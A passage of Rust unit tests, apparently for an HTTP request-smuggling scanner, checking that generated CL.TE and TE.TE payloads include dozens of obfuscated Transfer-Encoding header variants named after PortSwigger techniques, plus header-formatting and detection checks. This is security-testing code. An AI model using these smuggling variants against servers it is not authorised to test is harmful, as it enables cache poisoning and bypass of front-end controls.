        let payloads = get_cl_te_payloads("/", "test.com", "POST", &[], &[]);

        // UPPERCASE
        let has_uppercase = payloads.iter().any(|p| p.contains("TRANSFER-ENCODING:"));
        assert!(has_uppercase, "Missing UPPERCASE pattern");

        // lowercase
        let has_lowercase = payloads.iter().any(|p| p.contains("transfer-encoding:"));
        assert!(has_lowercase, "Missing lowercase pattern");

        // Mixed case
        let has_mixed = payloads
            .iter()
            .any(|p| p.contains("tRaNsFeR-eNcOdInG:") || p.contains("TrAnSfEr-EnCoDiNg:"));
        assert!(has_mixed, "Missing mixed case pattern");
    }

    #[test]
    fn test_portswigger_quoted_values() {
        let payloads = get_cl_te_payloads("/", "test.com", "POST", &[], &[]);

        // Double quoted
        let has_double_quoted = payloads
            .iter()
            .any(|p| p.contains("Transfer-Encoding: \"chunked\""));
        assert!(has_double_quoted, "Missing double-quoted chunked value");

        // Single quoted
        let has_single_quoted = payloads
            .iter()
            .any(|p| p.contains("Transfer-Encoding: 'chunked'"));
        assert!(has_single_quoted, "Missing single-quoted chunked value");
    }

    #[test]
    fn test_portswigger_comma_encoding() {
        let payloads = get_cl_te_payloads("/", "test.com", "POST", &[], &[]);

        // commaCow - chunked, identity
        let has_comma_cow = payloads
            .iter()
            .any(|p| p.contains("Transfer-Encoding: chunked, identity"));
        assert!(
            has_comma_cow,
            "Missing chunked, identity (commaCow) pattern"
        );

        // cowComma - identity, chunked
        let has_cow_comma = payloads
            .iter()
            .any(|p| p.contains("Transfer-Encoding: identity, chunked"));
        assert!(
            has_cow_comma,
            "Missing identity, chunked (cowComma) pattern"
        );
    }

    #[test]
    fn test_portswigger_lazygrep_pattern() {
        // Test that truncated "chunk" value is present
        let payloads = get_cl_te_payloads("/", "test.com", "POST", &[], &[]);
        let has_lazy = payloads
            .iter()
            .any(|p| p.contains("Transfer-Encoding: chunk\r\n"));
        assert!(has_lazy, "Missing truncated chunk (lazygrep) pattern");
    }

    #[test]
    fn test_portswigger_backslash_pattern() {
        // Test that backslash variation is present
        let payloads = get_cl_te_payloads("/", "test.com", "POST", &[], &[]);
        let has_backslash = payloads
            .iter()
            .any(|p| p.contains("Transfer\\Encoding: chunked"));
        assert!(has_backslash, "Missing backslash variation");
    }

    #[test]
    fn test_portswigger_suffix_patterns() {
        let payloads = get_cl_te_payloads("/", "test.com", "POST", &[], &[]);

        // CR suffix (0dsuffix)
        let has_cr_suffix = payloads
            .iter()
            .any(|p| p.contains("Transfer-Encoding: chunked\r\r\n"));
        assert!(has_cr_suffix, "Missing CR suffix (0dsuffix) pattern");

        // Tab suffix
        let has_tab_suffix = payloads
            .iter()
            .any(|p| p.contains("Transfer-Encoding: chunked\t\r\n"));
        assert!(has_tab_suffix, "Missing tab suffix pattern");
    }

    #[test]
    fn test_portswigger_badsetup_patterns() {
        let payloads = get_cl_te_payloads("/", "test.com", "POST", &[], &[]);

        // badsetupCR - CR only before TE header
        let has_cr_setup = payloads
            .iter()
            .any(|p| p.contains("Foo: bar\rTransfer-Encoding:"));
        assert!(has_cr_setup, "Missing badsetupCR pattern");

        // badsetupLF - LF only before TE header
        let has_lf_setup = payloads
            .iter()
            .any(|p| p.contains("Foo: bar\nTransfer-Encoding:"));
        assert!(has_lf_setup, "Missing badsetupLF pattern");
    }

    #[test]
    fn test_portswigger_0dspam_pattern() {
        // CR in middle of header name
        let payloads = get_cl_te_payloads("/", "test.com", "POST", &[], &[]);
        let has_0dspam = payloads
            .iter()
            .any(|p| p.contains("Tra\rnsfer-Encoding:") || p.contains("Transfer-\rEncoding:"));
        assert!(has_0dspam, "Missing 0dspam pattern");
    }

    #[test]
    fn test_portswigger_url_encode_pattern() {
        let payloads = get_cl_te_payloads("/", "test.com", "POST", &[], &[]);
        let has_url_encode = payloads.iter().any(|p| p.contains("Transfer-%45ncoding:"));
        assert!(
            has_url_encode,
            "Missing URL-encoded header (encode) pattern"
        );
    }

    #[test]
    fn test_portswigger_mime_encode_pattern() {
        let payloads = get_cl_te_payloads("/", "test.com", "POST", &[], &[]);
        let has_mime = payloads
            .iter()
            .any(|p| p.contains("=?iso-8859-1?B?") || p.contains("=?UTF-8?B?"));
        assert!(has_mime, "Missing MIME-encoded value pattern");
    }

    #[test]
    fn test_te_te_content_encoding_confusion() {
        // Test that Content-Encoding confusion is present in TE.TE
        let payloads = get_te_te_payloads("/", "test.com", "POST", &[], &[]);
        let has_content_enc = payloads
            .iter()
            .any(|p| p.contains("Content-Encoding: chunked"));
        assert!(
            has_content_enc,
            "Missing Content-Encoding confusion pattern"
        );
    }

    #[test]
    fn test_te_te_connection_header_combination() {
        // Test that Connection header combination is present
        let payloads = get_te_te_payloads("/", "test.com", "POST", &[], &[]);
        let has_connection = payloads
            .iter()
            .any(|p| p.contains("Connection: Transfer-Encoding"));
        assert!(
            has_connection,
            "Missing Connection header combination pattern"
        );
    }

    #[test]
    fn test_cookie_header_format() {
        let cookies = vec!["session=abc123".to_string(), "user=test".to_string()];
        let payloads = get_cl_te_payloads("/", "test.com", "POST", &[], &cookies);

        for payload in &payloads {
            assert!(
                payload.contains("Cookie: session=abc123; user=test\r\n"),
                "Cookie header should be properly formatted"
            );
        }
    }

    #[test]
    fn test_format_custom_headers_single() {
        let headers = vec!["X-Custom: value".to_string()];
        let result = format_custom_headers_test_helper(&headers);
        assert_eq!(result, "X-Custom: value\r\n");
    }

    #[test]
    fn test_format_custom_headers_multiple() {
        let headers = vec![
            "X-Custom-1: value1".to_string(),
            "X-Custom-2: value2".to_string(),
            "Authorization: Bearer token".to_string(),
        ];
        let result = format_custom_headers_test_helper(&headers);
        assert_eq!(result, "X-Custom-1: value1\r\nX-Custom-2: value2\r\nAuthorization: Bearer token\r\n");
    }

    #[test]
    fn test_format_cookies_single() {
        let cookies = vec!["session=abc123".to_string()];
        let result = format_cookies_test_helper(&cookies);
        assert_eq!(result, "Cookie: session=abc123\r\n");
    }

    #[test]
    fn test_format_cookies_multiple() {
        let cookies = vec![
            "session=abc123".to_string(),
            "user=test".to_string(),
            "preferences=dark".to_string(),
        ];
        let result = format_cookies_test_helper(&cookies);
        assert_eq!(result, "Cookie: session=abc123; user=test; preferences=dark\r\n");
    }

    #[test]
    fn test_contains_te_header_pattern_standard() {
        let payload = "POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n";
        assert!(
            contains_te_header_pattern(payload),
            "Standard Transfer-Encoding header should be detected"
        );
    }

    #[test]
    fn test_contains_te_header_pattern_obfuscated() {
        // Test various obfuscation patterns
        let patterns = vec![
            "Transfer_Encoding: chunked",     // Underscore
            "Transfer Encoding: chunked",     // Space
            "transfer-encoding: chunked",     // Lowercase
            "TRANSFER-ENCODING: CHUNKED",     // Uppercase
            "Transfer-Encoding:chunked",      // No space
            "Transfer-%45ncoding: chunked",   // URL-encoded
            "Content-Encoding: chunked",      // Content-Encoding confusion
            "Tra\rnsfer-Encoding: chunked",   // CR in name
        ];

        for pattern in patterns {
            assert!(
                contains_te_header_pattern(pattern),
                "Pattern '{}' should be detected",
                pattern
            );
        }
    }

    #[test]
    fn test_contains_te_header_pattern_negative() {
        let payload = "POST / HTTP/1.1\r\nContent-Length: 10\r\n\r\n";
        assert!(
            !contains_te_header_pattern(payload),
            "Payload without Transfer-Encoding should not be detected"
        );
    }

    #[test]
    fn test_te_header_variations_count() {
        // Ensure we have a comprehensive set of variations
        let te_variations = get_te_header_variations();

        // We should have at least 70 unique variations based on PortSwigger patterns
        assert!(
            te_variations.len() >= 70,
            "Expected at least 70 Transfer-Encoding variations, got {}",
            te_variations.len()
        );
    }
}
